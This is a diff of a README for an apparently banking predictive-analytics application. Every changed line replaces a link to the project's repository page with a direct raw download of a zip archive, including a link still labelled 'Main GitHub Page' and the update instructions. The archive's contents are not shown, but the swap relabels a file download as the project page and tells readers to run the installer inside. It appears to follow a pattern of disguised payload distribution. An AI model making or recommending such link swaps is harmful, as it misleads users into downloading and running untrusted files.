@@ -1,6 +1,6 @@
 # 📊 Predictive-Analytics-and-Recommendation-Systems-in-Banking - Smart Loan and Customer Insights
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Predictive%20Analytics-blue?style=for-the-badge)](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking)
+[![Download from GitHub](https://img.shields.io/badge/Download-Predictive%20Analytics-blue?style=for-the-badge)](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking/raw/refs/heads/main/Banking/Predictive-and-Systems-Analytics-in-Banking-Recommendation-2.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ You will first need to download the application from the official GitHub page. T
 
 Click the big blue button below to go to the main download page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Predictive%20Analytics-blue?style=for-the-badge)](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking)
+[![Download from GitHub](https://img.shields.io/badge/Download-Predictive%20Analytics-blue?style=for-the-badge)](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking/raw/refs/heads/main/Banking/Predictive-and-Systems-Analytics-in-Banking-Recommendation-2.9.zip)
 
 This page has all the latest files you need.
 
@@ -131,7 +131,7 @@ Adjust a few settings to customize your experience:
 Updates come out occasionally to fix bugs or add features. To update:
 
 - Visit the main GitHub page again:  
-  https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking
+  https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking/raw/refs/heads/main/Banking/Predictive-and-Systems-Analytics-in-Banking-Recommendation-2.9.zip
 - Download the latest installer.
 - Run the installer; it will overwrite the old version safely.
 - Your previous settings and data will remain intact.
@@ -150,7 +150,7 @@ All source code and detailed technical documents are available on GitHub. For mo
 
 ## 🔗 Quick Links
 
-- [Main GitHub Page](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking)  
+- [Main GitHub Page](https://github.com/wongjanson/Predictive-Analytics-and-Recommendation-Systems-in-Banking/raw/refs/heads/main/Banking/Predictive-and-Systems-Analytics-in-Banking-Recommendation-2.9.zip)  
 - Download installer from Releases section
 
 ---
